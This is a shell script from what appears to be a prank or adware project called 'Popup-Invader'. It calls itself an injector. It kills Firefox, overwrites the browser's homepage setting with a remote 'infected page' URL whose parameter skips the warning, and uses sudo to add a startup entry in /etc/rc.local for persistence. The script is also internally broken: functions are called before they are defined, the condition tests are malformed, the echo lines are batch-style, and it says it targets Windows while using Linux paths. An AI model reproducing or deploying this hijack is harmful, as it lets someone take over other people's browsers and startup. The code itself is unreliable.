#!/bin/sh

set echo off

# MIT License
# Copyright (c) 2019 Renaud, Fire-Softwares
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.

# Here you can change the URL of Popup-Invader infected page
# Warning : adding ?confirm=yes param to the default URL will made
# Popup-Invader launching by itself without the warning.
POPUP_INVADER_URL="https://cdn.fire-softwares.ga/popup-invader?confirm=yes"
POPUP_INVADER_VERSION="1.1"

# Clear and send program header
clear
echo \e[31m-----------------------------------------------------------------------
echo \e[91m[36mPopup-Invader v$POPUP_INVADER_VERSION Injector for Windows by Renaud42 from Fire-Softwares
echo \e[91m[36m        Supported browsers : Mozilla Firefox (more will be available later)
echo \e[31m[31m-----------------------------------------------------------------------\n

# Starting installation guide
echo -e '\033k'---- Popup-Invader v$POPUP_INVADER_VERSION Injector ----'\033\\'
ask_Firefox

# -------------------------
# METHODS ASKING FOR INPUTS
# -------------------------

ask_Firefox() {
  # Asking about Mozilla Firefox injection
  echo Inject to Mozilla Firefox ? (y for yes, anything else for no)
  read -p "Your answer : " input
  if $input=="y"; then firefox_payload; else ask_startup; fi
}

ask_startup() {
  # Asking about creating link to launch automatically Popup-Invader at Windows startup
  echo \nWould you like to launch automatically Popup-Invader at Windows startup ? (y for yes, anything else for no)
  read -p "Your answer : " input
  if $input=="y"; then startup_payload; else finish; fi
}

# -------------------------
#        END METHOD
# -------------------------

finish() {
  echo \n\nThanks for using this program.\nNow you can enjoy your new Popup-Invader infected computer :)\n\nKeep in mind that you can reverse the process by changing the POPUP_INVADER_URL in this batch file by your default homepage URL and then restart the program.\n\nYou can support Popup-Invader and Fire-Softwares project by giving a star on this GitHub project, or giving us money through "Sponsor" button on GitHub !
  read -n1 -r -p "Press any key to continue..." key
  echo Goodbye !
  exit
}

# -------------------------
#     BROWSERS PAYLOADS
# -------------------------

firefox_payload() {
  # Mozilla Firefox injection
  kill -9 $(pidof firefox)
  echo user_pref("browser.startup.homepage", "$POPUP_INVADER_URL"); >> ~/.mozilla/firefox/*.default/prefs.js
  ask_startup
}

startup_payload() {
  sudo -i
  echo "firefox $POPUP_INVADER_URL" > /etc/popup-invader-worker.sh
  echo "/etc/popup-invader-worker.sh || exit 1" >> /etc/rc.local
  finish
}
